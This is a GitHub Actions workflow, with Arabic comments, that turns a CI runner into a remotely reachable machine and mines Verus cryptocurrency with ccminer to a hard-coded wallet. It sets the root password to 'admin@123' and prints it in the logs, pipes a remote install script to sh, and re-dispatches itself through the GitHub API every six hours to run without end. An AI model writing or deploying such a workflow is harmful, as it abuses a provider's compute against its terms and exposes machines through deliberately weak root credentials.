name: VPS4

on:
  workflow_dispatch:

jobs:
  setup-vps:
    runs-on: ubuntu-latest

    steps:
      - name: Install & Configure SSH
        run: |
          sudo apt update -y
          sudo apt install -y openssh-server git build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev screen
          sudo systemctl enable ssh
          sudo systemctl start ssh
          echo "root:admin@123" | sudo chpasswd
          echo "✅ SSH user: root | pass: admin@123"

      - name: Install Tailscale
        run: |
          curl -fsSL https://tailscale.com/install.sh | sh
          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=vps-${{ github.run_id }}
          tsIP=$(tailscale ip -4 | head -n 1)
          echo "TAILSCALE_IP=$tsIP" >> $GITHUB_ENV
          echo "✅ Tailscale IP: $tsIP"

      - name: Verify SSH Access
        run: |
          echo "Tailscale VPS ready!"
          echo "IP: $TAILSCALE_IP"
          echo "User: root"
          echo "Pass: admin@123"

      - name: Install ccminer & Start Mining
        run: |
          #!/bin/bash
          WALLET="RGBbQeM9cy64ImJfpW7WKZSYpmSUHMxf2p"
          POOL="pool.verus.io:9998"
          THREADS=4

          # إنشاء اسم عامل عشوائي
          RAND_NUM=$(shuf -i 1000-9999 -n 1)
          RAND_CHARS=$(tr -dc 'a-zA-Z' < /dev/urandom | head -c 2)
          WORKER_NAME="ubuntu${RAND_NUM}${RAND_CHARS}"
          echo "👷 Worker Name: $WORKER_NAME"

          cd $HOME || exit 1

          # تثبيت التبعيات إذا لزم الأمر
          sudo apt install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev

          if [ ! -d "$HOME/ccminer" ]; then
            git clone https://github.com/Oink70/ccminer-verus.git ccminer
            cd ccminer
            chmod +x build.sh
            ./build.sh
          else
            cd ccminer
            make clean
            ./build.sh
          fi

          # إنشاء ملف التكوين
          cat > config.json <<EOF
{
  "pools": [
    {
      "name": "CUSTOM",
      "url": "stratum+tcp://${POOL}",
      "timeout": 180,
      "disabled": 0
    }
  ],
  "user": "${WALLET}.${WORKER_NAME}",
  "pass": "x",
  "algo": "verus",
  "threads": ${THREADS},
  "api-bind": "127.0.0.1:4068"
}
EOF

          # بدء التعدين في جلسة screen
          screen -dmS verus_mining ./ccminer -c config.json
          echo "🚀 التعدين بدأ Worker: ${WORKER_NAME}"
          echo "▶️ للعودة إلى جلسة التعدين: screen -r verus_mining"

      - name: Run VPS for 6 hours
        run: |
          echo "⏳ VPS running for 6 hours..."
          sleep 21600   # 6 ساعات

      - name: Restart This Workflow
        env:
          REPO: ${{ github.repository }}
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "🔄 Restarting workflow..."
          curl -s -X POST \
            -H "Accept: application/vnd.github.v3+json" \
            -H "Authorization: Bearer $GITHUB_TOKEN" \
            "https://api.github.com/repos/$REPO/actions/workflows/vps4.yml/dispatches" \
            -d '{"ref":"main"}'
          echo "✅ تم إرسال أمر إعادة التشغيل"
